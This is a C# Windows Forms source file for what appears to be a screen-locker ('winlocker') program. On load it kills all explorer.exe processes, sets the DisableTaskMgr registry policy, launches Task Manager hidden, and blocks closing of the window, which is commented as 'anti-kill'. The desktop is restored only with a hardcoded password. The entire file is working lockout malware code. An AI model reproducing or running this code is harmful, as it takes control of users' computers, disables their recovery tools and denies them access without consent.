using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Threading;
using static System.Net.WebRequestMethods;
using File = System.IO.File;

namespace WindowsFormsApp3
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //Important.DO NOT CHANGE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            var explorerProcesses = Process.GetProcessesByName("explorer");
            foreach (var process in explorerProcesses)
            {
                process.Kill();
            }
            RegistryKey regkey;
            string keyValueInt = "1";
                string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
                try
                {
                    regkey = Registry.CurrentUser.CreateSubKey(subKey);
                    regkey.SetValue("DisableTaskMgr", keyValueInt);
                    regkey.Close();
                }
                catch (Exception ex)
                {
                MessageBox.Show("Privet");
                }
            Process p = new Process();
            p.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
            p.StartInfo.FileName = "taskmgr.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();
            this.Focus();
        }

        private void noaltf4(object sender, FormClosingEventArgs noaltf4)
        {
            noaltf4.Cancel = true; //anti-kill
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (password.Text == "")
            {
                MessageBox.Show("Неверный");
            }
            else if (password.Text == "iwillnotcheating")
            {
                MessageBox.Show("Your Windows is unlocked");
                var proc = new System.Diagnostics.Process();
                proc.StartInfo.FileName = "C:\\Windows\\explorer.exe";
                proc.StartInfo.UseShellExecute = true;
                proc.Start();
            }
            else
            {
                MessageBox.Show("Неверный");
            }

        }

        private void button2_Click(object sender, EventArgs e)
        {
            System.IO.Stream str = Properties.Resources.big2;
            System.Media.SoundPlayer snd = new System.Media.SoundPlayer(str);
            snd.Play();
            MessageBox.Show("неа");
        }
    }
}
